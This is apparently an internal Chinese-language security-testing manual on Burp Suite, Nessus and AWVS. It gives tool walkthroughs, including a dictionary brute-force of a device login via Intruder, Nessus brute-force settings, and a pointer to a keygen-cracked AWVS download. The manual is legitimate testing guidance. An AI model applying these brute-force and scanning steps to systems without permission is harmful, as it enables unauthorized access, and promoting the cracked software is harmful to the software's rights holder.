+Intercept用于拦截HTTP请求和响应。当你编辑信息之后，单击forward发送信息到服务器或浏览器，当你不想要发送这次信息可以点击drop放弃这个拦截信息，单击intercept is off/on可以切换关闭/开启拦截，单击action按钮可以拦截选择之后的操作。
+ 
+
+Http history
+Http history选项卡里可以看到http请求的历史，数据总在更新，即使拦截关闭。
+ 
+Websockets history
+Websockets history能够看到websockets的请求，功能和http history一样。
+Option
+设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等。
+3.2.3	 Target功能
+Target分为site map和scope两个选项卡。他能帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息。
+ Site map
+Site map汇聚了所有 Burp 收集的关于你正在攻击的应用程序的信息。这包括了直接通过 Proxy 的请求，以及根据这些请求得到的响应的分析结果，和 Spider发现的所有内容。当你浏览一个应用程序时，会为你映射出大量的内容，甚至远远超过你的要求。例如：已请求的项目会以黑色显示；那些也被 Burp 推断出，但还未被请求过的以灰色显示。 
+SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请求的URL 。该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 。如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求/响应窗格。
+ Scope
+这个主要是配合Site map做一些过滤的功能，scope设置，可以在Target SiteMap和Proxy history上右击url “add to scope”添加，也可以自己手动添加。
+ 
+
+3.2.4	 Spider功能
+Burp Spider是一个自动获取 web 应用的工具。它使用多种智能技术来获取应用的内容和功能。 spider通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。 结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用视图。
+ 使用介绍
+在http history选项中选中一个请求，然后右击，在快捷菜单中选中spider from here进行爬取。
+ 
+运行过程中，切换到spider选项，可以看到并控制程序的运行状态。
+ 
+再切换至target选项就可以看到爬取的结果，并可以通过右键菜单操作哪些内容。
+
+3.2.5	 Scanner功能
+Burp Scanner 是一款自动发现 web漏洞的工具，可以执行两种扫描类型：active scanning和passive scanning。默认情况下以被动扫描运行。
+Active scanning 扫描器向应用程序发送大量的伪造请求，这些请求都是有一个基础请求衍生出来的，然后通过分析响应结果来查找漏洞特征。
+Passive scanning 扫描器不发送他自己的任何新请求，只分析现有的请求和响应的内容，从这些信息中推断出漏洞。
+ Scanner使用
+在sitemap或者http history中，右击选中的URL，可以选择do an active scan或者do a passive scan. 
+切换到scanner页面，可以看到并控制扫描的运行情况。 
+在scan queue页面，可以看到扫描进度，或者控制扫描。
+ 
+在living scan页面，可以设置是否进行自动扫描或者被动扫描。 
+ 报告导出
+右击选中的漏洞，选择report issue，导出报告。 
+可以选择html或者xml格式，
+ 
+一路next，然后选择保存地址 
+报告内容
+ 
+3.2.6	 Intruder
+使用介绍
+Burp Intruser 是一个对 web 进行自动化的自定义攻击的工具，可用于暴力破解、SQL注入、模糊测试等。
+结合具体例子来看一下字典攻击破解设备用户名、密码的过程。(需要将设备登录设备次数调大一点，SG-6000(M)(config)# admin max-login-failure 256)
+1.设置代理，登录设备UI，将提交用户名、密码的post请求发送到intruder（用户名和密码随意）
+2.进入intruder页面，在target页签下可以看到要攻击的目标
+ 
+3.在position页签下可以看到之前发送给intruder的请求。Intruder对进行猜解的参数进行了高亮显示，在猜解用户名和密码的过程中，要求用户名和密码作为参数不断改变，于是需要对应的配置Burp。 
+4.单击右边的clear按钮删除所有待猜解参数。burp在这次攻击中只需把用户名和密码作为参数，选中用户名，然后单击add按钮添加，同样将password也添加进去。 
+5.选择攻击类型
+先看一下sniper、battering ram、pitchfork、cluster bomb的区别。
+假设有两个攻击点，username和password，Payload添加为1和2.
+ 
+
+1）Sniper：使用一个payload（字典）。每次在用payload中的一个值取替代一个待攻击的原始值。这种攻击类型对模糊测试的一些请求参数的漏洞非常有用。在攻击中生成的请求的总数是payload和待攻击参数数量的乘积。
+ 
+
+2）Battering ram：使用一个payload（字典）。它每次同时在所有待攻击参数位置插入同一payload。当一次攻击需要在 HTTP 请求(如，Cookie 消息头和消息体里的用户名)中的多个位置上插入相同的有效负荷时，这个攻击类型非常有用。攻击产生的所有请求数量就是有效载荷的数量。
+ 
+
+3)Pitchfork：需要多个payload，payload集合个数等于待破解参数的个数。它给每个参数指定一个payload，攻击同时通过所有的有效负荷集合进行迭代，并在每一个位置上插入一个有效载荷。例如，第一个请求会把第一个payload里第一个值插入到第一个攻击位置，第二个payload里第一个值插入到第二个攻击位置。第二个请求会把第一个payload的第二个值插入到第一个位置，把第二个payload的第二个有效负荷插入到第二个位置，等等。当攻击需要将不同的但相关的输入插入到 HTTP 请求(如，一个数据域里的用户名，以及在其他数据域里的一个和用户名相关的 ID 号)的多个位置里时，这个攻击类型会有用的。由于payload集合的基数大小可能不一样，所以攻击产生的所有的请求数量是由payload基数的最小值决定。
+ 
+
+ 
+4）cluster bomb：需要多个payload，payload集合个数等于待破解参数的个数。它给每个参数指定一个payload。攻击会按照每个有效负荷集合的顺序进行迭代，于是所有的有效负荷排列组合都会被测试。例如，如果有 2 个有效负荷位置，攻击会把第一个有效负荷集合里的第一个有效负荷放置在第一个位置，在位置 2 里会迭代第二个有效负荷里的所有有效负荷；然后他会把第一个集合里第二个有效负荷放在第一个位置，然后在位置 2 上迭代集合 2 里的所有有效负荷。当攻击需要在 HTTP 请求(如，一个参数里的用户名和另一个参数里的密码)里插入不同的并且不相关的输入时，这个攻击类型会很有效。攻击产生的请求数量是在所有payload基数个数的乘积。 
+6.进入payload选项，选择payload set的值为1，单击load按钮加载一个包含诸多用户名的文件。同样设置payload set的值为2，加载一个包含密码的文件。
+7.设置完成后，点击start attack按钮开始攻击
+8.开始攻击后，会弹出一个窗口，其中有制作好的所有请求。成功的请求与不成功的请求响应不同，所以长度也不一样。一般长的是破解成功的。
+ 
+
+3.2.7	 Repeater
+Burp Repeater作为Burp Suite中一款手工验证HTTP消息的测试工具，通常用于多次重放请求响应和手工修改请求消息后对服务器端响应的消息分析。
+比如修改请求参数，验证输入的漏洞；修改请求参数，验证逻辑越权；从拦截历史记录中，捕获特征性的请求消息进行请求重放。
+使用介绍
+选中需要修改的请求右击，选中“send to repeater”。切换到repeater页面，请求消息区为客户端发送的请求消息的详细信息，用户可以手动修改请求。 
+当我们对请求的消息编辑完之后，点击“GO”按钮发送请求给服务器端。
+应答消息区为对应的请求消息点击GO”按钮后，服务器端的反馈消息。通过修改请求消息的参数来比对分析每次应答消息之间的差异，能更好的帮助我们分析系统可能存在的漏洞。 
+
+
+3.2.8	 Sequencer
+Burp Sequencer作为Burp Suite中一款用于检测数据样本随机性质量的工具，通常用于检测访问令牌是否可预测、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。
+使用介绍
+1.选择登录设备的请求，发送到sequencer 
+2.进入Burp Sequencer的Live Capture面板，选中刚才发送过来的记录，点击Configure配置需要分析的token或者参数。 
+ 
+3.在弹出的参数配置对话框中，选中参数的值，点击【OK】按钮，完成参数设置
+ 
+ 4.点击【Select Live Capture】，开始进行参数值的获取。 
+ 
+5.当抓取的参数值总数大于100时，点击【pause】或者【stop】，这时可以进行数据分析，点击【Analyze now】即进行数据的随机性分析。 
+ 
+6.等分析结束，则可以看到分析结果的各种图表。 
+ 
+
+7.当然，我们也可以把获取的数据保存起来，下一次使用的时候，从文件加载参数，进行数据分析。如下图保存数据。 
+ 
+8.当我再次使用时，直接加载数据进行分析即可。 
+ 
+
+3.2.9	 Decoder
+Burp Decoder的功能比较简单，作为Burp Suite中一款编码解码工具，它能对原始数据进行各种编码格式和散列的转换。其界面如下图，主要由输入域、输出域、编码解码选项三大部分组成。 
+ 
+输入域即输入需要解码的原始数据，此处可以直接填写、粘贴，也可以通过其他Burp工具的上下文菜单中【Send to Decoder】；输出域即对输入域进行解码的结果显示出来。无论是输入域还是输出域都支持文本与十六进制两种格式，其中编码解码选项中，由解码选项（Decode as)、编码选项（Encode as)、散列（Hash）三个构成。实际使用中，可以根据场景的需要进行设置。对于编码解码选项，目前支持URL、HTML、Base64、ASCII、16进制、8进制、2进制、GZIP共八种形式的格式转换，Hash散列支持SHA、SHA-224、SHA-256、SHA-384、SHA-512、MD2、MD5格式的转换。 
+3.2.10	 Compare
+Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。
+  使用场景
+①枚举用户名过程中，对比分析登陆成功和失败时，服务器端反馈结果的区别。 
+②使用 Intruder 进行攻击时，对于不同的服务器端响应，可以很快的分析出两次响应的区别在哪里。 
+③进行SQL注入的盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系。
+ 使用介绍
+对于Comparer的使用，主要有两个环节组成，先是数据加载，然后是差异分析。 Comparer数据加载的方式常用的有：从其他Burp工具通过上下文菜单转发过来、直接粘贴、从文件加载三种方式。当加载完毕后，如果你选择了两次不同的请求或应答消息，则下发比较的按钮将被激活，可以选择文本比较或者字节比较。如下图： 
+ 
+如果点击了【words】或者【bytes】，则进入比对界面，页面自动通过背景颜色显示数据的差异。如下图：
+ 
+其中，文本比较（words）是指通过文本的方式，比如说以HTML的方式，比较两个数据的差异；而字节比较（bytes）是指通过16进制的形式，比较两次内容的差异。如下图,注意下发不同内容的颜色标注。 
+ 
+
+3.3	Nessus漏洞扫工具
+3.3.1	 Nessus概述
+Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus通常包括成千上万的最新的漏洞，各种各样的扫描选项，及易于使用的图形界面和有效的报告。Nessus之所以被人们喜爱，是因为该工具具有几个特点。如下所示：
+提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。
+不同于传统的漏洞扫描软件。Nessus可同时在本机或远程控制，进行系统的漏洞分析扫描。
+其运作效能随着系统的资源而自行调整。如果将主机配置更多的资源（如加快CPU速度或增加内存大小），其效率表现可因为丰富资源而提高。
+可自行定义插件。
+NASL（Nessus Attack Scripting Language）是由Tenable所发出的语言，用来写入Nessus的安全测试选项。
+完全支持SSL（Secure Socket Layer）。
+3.3.2	 安装Nessus工具
+Nessus工具不仅可以在电脑上使用，而且还可以在手机上使用。下面将主要介绍在windows操作系统平台上安装Nessus工具的方法。
+1.获取Nessus安装包
+Nessus的官方下载地址是：
+http://www.tenable.com/products/nessus/select-your-operating-system
+在浏览器中输入以上地址，将打开如下图所示的界面。
+ 
+从该界面可以看到Nessus有适合不同操作系统的版本，这里我们选择适用windows系统的版本下载。在该界面单击Nessus Home下面的Download按钮，将显示如下图所示的界面。
+ 
+从该界面可以看到，官网提供了Nessus工具各种平台的安装包，如Windows、Mac OS X、Linux、FreeBSD等。用户可以根据自己的操作系统及架构，选择对应的安装包。例如，下载Windows 64位架构的包，则单击Nessus-6.10.4-x64.msi。下载好后直接运行安装。
+Nessus工具在Linux下安装
+下面将以ubuntu为例，介绍在Linux下安装Nessus工具的方法。具体操作步骤如下所示：
+（1）从官网上下载安装包。本例中下载的安装包文件名为Nessus-6.10.4-ubuntu1110_amd64.deb
+（2）将下载的安装包复制到ubuntu中，本例中复制到/mnt/myspace/下。接下来，就可以安装Nesus工具了。执行命令如下所示：
+ 
+看到输出以上类似信息，则表示Nessus工具安装完成。接下来，用户在浏览器的地址栏中输入https://Server:8834/或https://IP:8834，即可访问Nessus服务。
+提示：在Linux系统中，Nessus工具默认安装在/opt/nessus目录中。
+同样，如果要在Linux下使用Nessus工具，也需要先激活该服务。其中，激活方法和Windows下的激活方法是相同的。唯一不同的是，信任证书方式不同。如下所示：
+（1）在RHEL 6.4的浏览器地址栏中输入https://IP:8834，访问Nessus服务。本例中，主机的IP地址是192.168.1.102，所以输入的地址为https://192.168.1.102:8834/。在浏览器地址栏中输入该地址后，将打开如下图所示的界面。
+ 
+注意：Nessus服务使用的是https协议，而不是http协议。
+（2）在该界面显示该连接不受信任。这是因为Nessus是一个安全连接（HTTPS协议），所以需要被信任后才允许登录。此时，在该界面单击“我已充分了解可能的风险”选项，将显示如上图所示的界面。 
+（3）该界面显示了该连接可能存在的风险。此时，单击“添加例外”按钮，将显示如下图所示的界面。
+ 
+（4）在该界面单击“确认安全例外”按钮，将显示如上图所示的界面。
+3.3.3	 激活Nessus
+在使用Nessus之前，必须先激活该服务才可使用。如果要激活Nessus服务，则需要到官网获取一个激活码。下面将介绍获取激活码的方法。具体操作步骤如下所示：
+（1）在浏览器中输入以下地址：
+http://www.nessus.org/products/nessus/nessus-plugins/obtain-an-activation-code
+成功访问以上链接后，将打开如下图所示的界面。
+ 
+这里有三个版本的激活码获取方式，分别是Home（家庭版）和Professional（专业版）和Manager（管理版）。这两个版本的区别如下所示：
+家庭版：家庭版是免费的，主要是供非商业性或个人使用。该版比较适合个人使用，并且可以用于非专业的环境。
+专业版：专业版是需要付费的。但是，可以免费使用七天。该版主要是供商业人士使用。它包括技术支持或附加功能，如无线并发连接等。
+管理版：相对专业版管理版支持更强的管理功能，包括多用户扫描管理，漏洞资源管理，补丁管理等。
+
+（2）这里我们选择免费的家庭版，在该界面单击Nessus Home Free下面的Register Now按钮，将显示如下图所示的界面。
+ 
+（3）在该界面填写一些信息，为了获取激活码。在该界面First Name和Last Name文本框中，用户可以任意填写。但是，Email下的文本框必须填写一个合法的邮件地址，用来获取邮件。当以上信息设置完成后，单击Register按钮。接下来，将会在注册的邮箱中收到一份关于Nessus的邮件。进入邮箱打开收到的邮件，将会看到一串数字，类似XXXX-XXXX-XXXX-XXXX，即激活码。
+（4）在浏览器中访问https://localhost://8834或者在软件安装完成时点击finish会自动打开对应的url，就可以使用以上获取到的激活码来激活该服务了。
+ 
+（7）如上图所示该界面提示访问Nessus服务需要通过SSL协议，在该界面点击clicking here链接，将打开如下图所示的界面。
+ 
+图1.8 安全证书
+（8）该界面提示证书存在错误，是因为该站点使用了不受信任的自签名的SSL证书。如果确认该站点没问题，则单击“继续浏览此网站”选项，将显示如下图所示的界面。
+ 
+（9）该界面显示了Nessus工具的欢迎信息。此时，单击Continue按钮，将显示如上图所示的界面。 
+（10）该界面用来创建一个帐号，用户管理Nessus服务。这里创建一个名为admin的用户，并为该用户设置一个密码。设置完成后，单击Continue按钮，将显示如下图所示的界面。
+ 
+（11）在该界面Activation Code对应的文本框中，输入前面获取到的激活码。然后，单击Continue按钮，将开始加载Nessus中的插件，如图上图所示。
+（12）从该界面可以看到正在下载插件，并进行初始化。此过程，大概需要十分钟的时间。当初始化完成后，将显示如下图所示的界面。
+ 
+（13）该界面是登录Nessus服务界面。在该界面输入的用户名和密码，就是在前面初始化过程中创建的用户和密码。输入用户名和密码后，单击Sign In按钮，即可成功登录Nessus服务。
+提示：以上过程中的Nessus服务登录界面，是自动弹出的。当用户关闭后，则需要重新登录。此时，用户在浏览器中输入https://IP:8834/或https://主机名:8834/地址，即可打开如图1.12所示的界面。然后，选择“继续浏览此网站”选项，即可打开登录页面。
+3.3.4	配置nessus
+3.3.4.1	 启动Nessus服务
+Nessus服务安装后，默认是自动启动的。如果用户重启系统，获取进行其它操作时，将Nessus服务关闭的话，则再次访问必须要先启动该服务。下面将分别介绍在不同操作系统中，启动Nessus服务的方法。
+在Windows下启动Nessus服务的方法如下所示：
+（1）打开Windows系统的服务窗口。在Windows系统的启动菜单栏中单击“运行”命令，将弹出“运行”对话框，在该对话框中输入“services.msc”，然后单击“确定”按钮，将打开“服务”窗口，如下图所示。
+  
+图：windows服务管理器
+（3）在该界面的名称列找到“Tenable Nessus”服务，即可管理该服务，如停止、启动或重新启动等。
+在Windows中，也可以通过命令行停止或启动Nessus服务。例如，停止Nessus服务。执行命令如下所示：
+C:\Users\Administrator>net stop "Tenable Nessus"Tenable Nessus 服务正在停止.Tenable Nessus 服务已成功停止。 
+从以上输出信息中，可以看到Nessus服务已成功停止。如果启动Nessus服务，执行命令如下所示：
+C:\Users\Administrator>net start "Tenable Nessus"Tenable Nessus 服务正在启动 .Tenable Nessus 服务已经启动成功。 
+从以上输出信息中，可以看到Nessus服务已成功启动。
+2、Linux下启动Nessus服务
+在Linux下启动Nessus服务。执行命令如下所示：
+hillstone@ubuntu:/mnt/myspace$ sudo service nessusd start
+Starting Nessus : . 
+从以上输出信息中，可以看到Nessus服务已成功启动。如果用户不确定该服务是否启动的话，可以使用以下命令查看其状态。如下所示：
+root@ubuntu:~# service nessusd status
+Nessus is running 
+从以上输出信息中，可以看到Nessus服务正在运行。
+3.3.4.2	 Nessus软件更新
+为了能够使用Nessus进行一个成功的漏洞扫描，在扫描之前检查并且更新Nessus，使用最新的插件是非常重要的。这样可以保证扫描到所有最新的漏洞。下面将以Windows操作系统为例，介绍更新插件的方法。
+1.在线更新
+在Windows下更新Nessus中的插件。具体操作步骤如下所示：
+（1）登录Nessus服务。在Windows中的浏览器地址栏输入https://IP:8834/地址，使用用户名和密码登陆进入。
+（2）在该界面单击右上角的设置（小齿轮）图标，将会弹出一个菜单栏，如下图所示。
+ 
+（5）从该界面左侧栏中，可以看到有两个子选项，即Overview（概述）和Software Update（软件更新）选项。图1.28中，显示的是Overview选项中的信息。其中，包括Nessus版本、连接时间、平台、最近更新时间、激活码等。如果要进行软件更新，则选择Software Update选项，将显示如图下图所示的界面。
+  
+（6）从该界面可以看到在Automatic Updates（自动更新）下面有三种更新方式，分别是Update all components（更新所有组件）、Update plugins（更新插件）和Disabled（禁止更新）。用户可以选择任何一种更新方式。而且，Nessus还提供了一种自定义插件更新方式，用于针对特定的主机。例如，更新IP地址为192.168.1.100主机提供的插件，则在Custom Host对应的文本框中输入地址192.168.1.100。如果用户不希望自动更新的话，还可以进行手动更新。在该界面单击右上角的Manual Software Update（手动更新）按钮，将显示如下图所示的界面。
+ 
+（7）这里也提供了三种更新方式，分别是Update all components（更新所有组件）、Update plugins（更新插件）和Upload your own plugin archive（上传自己的插件文档）。用户选择想要的更新方式后，单击Continue按钮，即可开始更新。更新完成后，右上角（铃铛）图标处会提示更新成功。
+ 2.离线更新
+以上的更新方式属于在线更新。使用这种方式更新的话，必须要确定自己的网络一直处于正常状态。如果用户不能确认自己网络的话可以使用离线更新方式。这种方式不需要Nessus系统连接必须连接到互联网。下面将介绍离线更新的方式。
+下面将以Windows 7操作系统为例，介绍离线更新插件的方法。
+（1）获取一个激活码。由于获取的激活码，只能使用一次。所以，如果再次激活服务，需要重新获取一个激活码。
+（2）生成一个挑战码，执行命令如下所示：
+D:\Program Files\Tenable\Nessus> nessuscli.exe fetch --challenge 
+执行以上命令后，显示效果如图下图所示。
+ 
+图：生成挑战码
+提示：如果是在Linux系统中的话，执行命令如下所示：
+[root@localhost ~]# /opt/nessus/sbin/nessuscli fetch --challenge 
+（3）从上图中可以看到生成了一个激活码。接下来，就可以离线下载Nessus插件了。其中，下载地址为https://plugins.nessus.org/v2/offline.php。
+（4）在该界面的第一行文本框中输入步骤（2）中获取到的挑战码，第二行文本框中输入获取到的激活码。然后，单击Submit按钮，即可开始下载插件。
+3.3.4.3	新建nessus扫描
+1）软件激活后就可以开始扫描测试了，通过WEB UI访问HTTPS://IP:8834，使用用户名和密码登陆后，点击scans菜单页面中New Scan按钮新建扫描任务，如下图所示。
+ 
+2）根据需要选择所使用的扫描策略类型，这里我们选择advanced Scan
+ 
+3）进入到扫描任务配置页面后，先填写基本的信息，包括任务名称和扫描对象的ip地址，可以扫描多个IP地址，通过逗号分隔，家庭版一个任务最多可以扫描16个ip地址
+ 
+4）在点击打开DISCOVERY——Port Scanning页面，使能Override automatic firewall detection选项用来配置检测扫描仪与扫描对象之间是否有防火墙，可选择Use aggressive detection选项，将尝试在端口扫描时使用对应的插件进行扫描，即使扫描的端口是关闭的。
+ 
+5）点击打开ASSESSMENT——Brute Force页面，去勾选Only use credentials provided by the user的选项，这样nessus会尝试常用的用户名和密码去对目标系统进行暴力破解
+ 
+6）如果扫描对象是WEB应用，可以在配置时使能Web applications的扫描选项，并按需配置需要扫描的站点地址和对应的扫描配置，如下图所示，扫描配置说明如下表：
+ 
+ 
+
+选项 	描述 
+Enable generic Web application test	启用下面列出的选项。 
+Abort web application tests if HTTP login fails	如果 Nessus 无法登录到目标通过 HTTP，那么请不要运行任何 web 应用程序测试。 
+Try all HTTP methods	默认情况下，Nessus 将仅在测试使用 GET 请求。此选项会指示 Nessus 也增强了对 web 窗体检测使用"POST 请求"。默认情况下，web 应用程序测试将仅使用 GET 请求，除非启用了此选项。一般来说，更复杂的应用程序使用 POST 方法，当用户提交到应用程序的数据。此设置提供了更全面的测试，但可能会大大增加所需的时间。选中后，Nessus 将测试每个脚本/变量与 GET 和 POST 请求。 
+Attempt HTTP Parameter Pollution	在执行 web 应用程序测试时，试图绕过任何过滤机制注入一个变量同时提供有效含同一变量的内容。例如，正常的 SQL 注入测试可能看起来像 
+"/target.cgi?a= & b = 2"。与 HTTP 参数污染 （HPP） 启用，该请求可能看起来像"/target.cgi?a= & = 1 & b = 2"。 
+Test embedded web servers 	嵌入式的 web 服务器通常是静态的并且包含没有可定制的 CGI 脚本。此外，嵌入式的 web 服务器可能容易崩溃或成为非响应性扫描时。站得住脚的建议扫描嵌入式 web 服务器分别从其他 web 服务器使用此选项。 
+Test more than one parameter at a time per form	此选项管理 HTTP 请求中使用的参数值的组合。默认情况下，如果没有选中此选项，正在测试一个参数攻击字符串，一次没有尝试"非攻"变体的附加参数。例如，Nessus 会尝试"/test.php?arg1=XSS & b = 1 & c = 1"在哪里"b"和
+"c"允许其他的值，而无需测试的每个组合。这是最快的方法的测试与最小生成的结果集。
+此下拉有三个选项：
+测试随机对参数— — 这种形式的测试将随机检查随机成对的参数组合。这是最快的方法来测试多个参数。
+测试所有成对的参数 （慢） — — 这种形式的测试是速度稍慢，但比"一价值"都测试效率更高。同时测试多个参数，它将测试一个攻击字符串，对于单变量的变化和所有其他变量，然后使用第一个值。Nessus 会尝试为例，"/test.php?a=XSS & b = 1 & c = 1、 d = 1"，然后在循环变量的这样一个人给出了攻击字符串、 一个循环通过所有可能的值 （如在镜像过程中发现） 和任何其他变量给出的第一个值。在这种情况下，Nessus 永远不会为测试"/test.php?a=XSS & b = 3 c = 3 d = 3"当每个变量的第一个值为"1"。
+测试随机组合的三个或多个参数 （较慢） -这种形式的测试将随机检查三个或更多参数的组合。这是比测试的参数仅对更为彻底。注意增加组合三个或更多会增加 web 应用程序测试时间。
+测试的参数 （慢） 的所有组合— — 这种测试方法会攻击字符串与有效的输入变量的所有可能组合的完全详尽都测试。凡"全双"测试旨在创建一个较小的数据集作为折衷的速度，"所有组合"的在时间上的不妥协，并使用一套完整的数据的测试。这种测试方法可能需要很长的时间才能完成。
+Do not stop after the first flaw is found per web page	此选项确定当一个新的缺陷有针对性的。这适用于脚本的水平 ；找到一个 XSS 缺陷不会禁用搜索 SQL 注入或头注入，但你会对一个给定的端口，有顶多一报告为每个类型，除非设置了"全面测试"。请注意几个相同的类型 （例如，XSS、 SQLi 等） 的缺陷的报告可能有时候，如果他们遇上了同样的攻击。下拉型有四个选项： 停止后每个 web 服务器 （最快） 发现了一个缺陷— — 尽快缺陷发现在 web 服务器上的一个脚本，Nessus 停止并切换到另一个 web 服务器的不同端口上。 Nessus停止后，每个参数 （慢） 发现了一个缺陷— — 尽快在 CGI （例如，XSS） 参数中发现了一种类型的缺陷，切换到下一个参数的相同的 CGI 或下一个已知的 CGI，或每个服务器的端口下。
+寻找所有缺陷 （慢） — — 执行全面的测试，无论发现的缺陷。此选项可以生成一个非常详细的报告，并不推荐在大多数情况下。
+URL for Remote File Inclusion	在远程文件列入 （RFI） 测试时，此选项指定要用于测试的远程主机上的文件。默认情况下，Nessus 将使用 RFI 测试 Tenable 的 web 服务器上承载的安全文件。如果扫描仪不能访问互联网，建议使用一个内部托管的文件用于更精确 RFI 测试。
+Maximum run time (minutes)	此选项管理总时间以分钟计算的时间执行 web 应用程序测试。此选项默认值为 5 分钟，并适用于所有端口和 Cgi 为给定的 web 站点。扫描本地网络中的小型应用程序的 web 站点会通常完成下一个小时，但是，对于大型应用程序的 web 站点可能需要较高的价值。
+7）对于攻击者使用nessus进行目标对象漏洞探测，credentials是不用配置的，但对于安全测试人员想通过nessus深入探测被测系统是否存在漏洞，配置credentials是非常有必要的，有利于nessus扫描仪进入到目标对象的内部进行更深入的扫描。
+点击credentials——Host配置常用的SSH登陆凭证或者是Windows的登陆凭证，或者是要扫描的目标对象的一切可以登录访问的凭证，配置的方式越多，扫描就会越全面。
+ 
+8）然后选择扫描使用的插件。插件是nessus进行漏洞扫描和判断的主要手段，nessus收录了当前已知的大部分漏洞，通过插件脚本定义的规则，对目标系统进行探测，以判断扫描对象是否存在对应的漏洞并在结果报告中给出对应的修复建议。
+默认是所有的插件都使能的，我们也可以根据需要筛选需要对应的漏洞进行扫描测试。点击Plugins页面，在右上角区域有过滤搜索栏，点击三角形的下拉框，可以添加过滤规则，多条过滤规则之间可以配置是与或者是或的关系。
+ 
+9）其他的配置可以保持默认配置即可，最后保存扫描的配置，点击打开Scans——My scans页面，点击对应扫描任务的启动按钮启动扫描，扫描结束后可以直接点击扫描任务查看对应的结果。
+ 
+3.4	AWVS
+3.4.1	概述
+Acunetix  Web Vulnerability Scanner（简称AWVS）是一个自动化的Web应用程序安全测试工具，它可以扫描任何遵循HTTP/HTTPS规则的Web站点和Web应用程序。AWVS可以通过网络爬虫、检查SQL注入攻击漏洞、跨站脚本攻击漏洞等来检测Web应用程序的安全性。
+安装下载地址：ftp://10.180.187.2/%B9%A4%BE%DF/ Acunetix_Web_Vulnerability_Scanner_10.x_Consultant_Edition_KeyGen_Hmily[LCG].zip
+直接下一步安装，安装完用注册机注册下。
+主要功能
+AWVS主要包含一下功能：
+WebScanner，核心功能，Web安全漏洞扫描
+Site Crawler，爬虫功能，遍历站点目录结构
+Target Finder，端口扫描，找出web服务器，80,443
+Subdomain Scanner，子域名扫描器，利用DNS查询
+Blind SQL Injector，盲注工具
+HTTP Editor，http协议数据包编辑器
+HTTP Sniffer，HTTP协议嗅探器
+HTTP Fuzzer，模糊测试工具
+Authentication Tester，Web认证破解工具
+
+3.4.2	 Web Scanner
+Web scanner功能就是对网址进行扫描，从而发现漏洞。
+2.1配置步骤
+点击菜单栏的 New Scan 新建扫描， 网站扫描开始前，需要设定一些选项，包括Scan type、option、target、login和finish。
+2.1.1 Scan type
+选择扫描一个单独web站点，或者导入WVS内置 site crawler的爬行结果，然后进行漏洞扫描。
+ 
+Scan single website：在Website URL处填入需要扫描的网站网址，如果你想要扫描一个单独的应用程序，而不是整个网站，可以在填写网址的地方写入完整路径。WVS支持HTTP/HTTPS网站扫描。
+Scan using saved crawling results：导入WVS内置 site crawler的爬行到的结果，然后对爬行的结果进行漏洞扫描。
+Access the scheduler interface：如果被扫描的网站构成了一个列表形式(也就是要扫描多个网站的时候)，那么可以使用Acunetix的Scheduler功能完成任务，访问 http://localhost:8183，扫描后的文件存放在“C:\Users\Public\Documents\Acunetix WVS 10\Saves”.
+2.1.2 option
+设置侧重扫描的漏洞类型，主要分为两部分:scanning options和crawling options。
+ 
+1）Scanning profile：设置侧重扫描的类型，包含16种侧重检测类型，如下：
+ 
+2）Scan setting
+扫描配置，可定制扫描器扫描选项,AWVS在默认情况下只有“default”默认扫描参数配置策略，点击旁边的Customize则可以自定义配置。
+ 
+
+2.1.3 Advanced 
+在扫描向导中显示高级扫描设置，如下就是高级选项配置。
+ 
+After crawling let me choose the files to scan：在爬行结果之后选择我们需要扫描哪些文件。
+Define a file to be imported by crasler at start:自定义从哪里开始扫描，导入txt文件，例如扫描http://www.baidu.com，不想从根路径开始扫，而从二级目录http://www.baidu.com/test/，将其保存到txt文件中之后将从test二级目录开始扫描。
+Use external testing tools during crasl：爬行的时候使用外部测试工具，蜘蛛爬行的过程中将运行您设置的命令，以及超时时间设置。
+Selenium script：设置包含一个火狐扩展插件Selenium IDE生成的HTML文件，蜘蛛爬行的过程中将会根据它来进行爬行。
+2.1.4 Target
+配置完成后会扫描服务器信息，内容有目标的根路径、服务的banner、目标URL、目标操作系统、目标的Web容器、目标的程序语言。如果信息不对，可以手动调整。
+ 
+2.1.5 Login
+配置登录web的用户名和密码。
+可以使用预先设置的登录序列，可以直接加载lsr文件，也可以点击白色处开始按照步骤新建一个登录序列，或者填写用户名密码，尝试自动登录。在某些情况下，可以自动识别网站的验证。
+ 
+2.1.6 Finish
+ 
+AcuSensor setup：使用AcuSensor传感技术的设置.
+Case insensitive server：爬行与扫描中是否区分大小写
+Save customized scan settings：将这次的设置保存为一个策略，以便下次直接使用策略 
+点击finish按钮开始扫描，扫描得到的结果如下图所示，会显示被扫描的系统有哪些漏洞。
+ 
+3.4.3	site crawler
+Site crawler可爬行网站所有URL，了解网站基本目录结构，以便于进行下一步的扫描。
+在start url处填上要爬行的url，点击start开始爬行。下图为爬取www.hillstonenet.com.cn的结果。
+ 
+
+3.4.4	 target finder
+对端口（默认80、443）、web服务器banner信息进行探测。
+首先探测指定IP/IP段开放特定端口的IP；探测出IP后，探测该端口的banner信息，可探测出该端口上运行的WEB服务的中间件的版本信息。
+在IP Range后输入IP或IP段，点击Start开始扫描。下图是对10.180.185.1-250的扫描结果。
+ 
+
+3.4.5	 Subdomain Scanner
+Subdomain Scanner主要用来探测并猜解子域名的信息。
+Domain后填上要扫描的域名，选择Use DNS Server from target(使用目标的DNS服务器探测解析)或Use Specified DNS Server（使用自定义的DNS服务器，在旁边可以填写自定义的DNS服务器），点击Start开始扫描
+下图是对weibo.com的探测结果。
+ 
+
+3.4.6	 Blind SQL Injection
